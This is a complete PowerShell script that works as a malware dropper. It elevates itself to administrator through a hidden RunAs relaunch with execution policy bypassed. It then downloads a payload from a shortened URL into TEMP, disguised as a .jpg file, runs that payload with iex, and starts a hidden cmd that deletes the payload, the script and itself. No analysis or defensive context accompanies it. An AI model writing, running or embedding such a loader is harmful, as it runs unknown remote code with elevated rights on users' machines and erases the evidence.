if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
    Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
}
$url="https://surl.li/vbiwyb"
$path="$env:TEMP\0x480x8b0x5.jpg"
(New-Object Net.WebClient).DownloadFile($url,$path)
iex(Get-Content $path -Raw)
Start-Process -WindowStyle Hidden cmd -ArgumentList "/c timeout /t 75 /nobreak > nul & del /f /q $env:TEMP\04A7C1QX50.ps1 $env:TEMP\0x480x8b0x5.jpg & del /f /q %0"
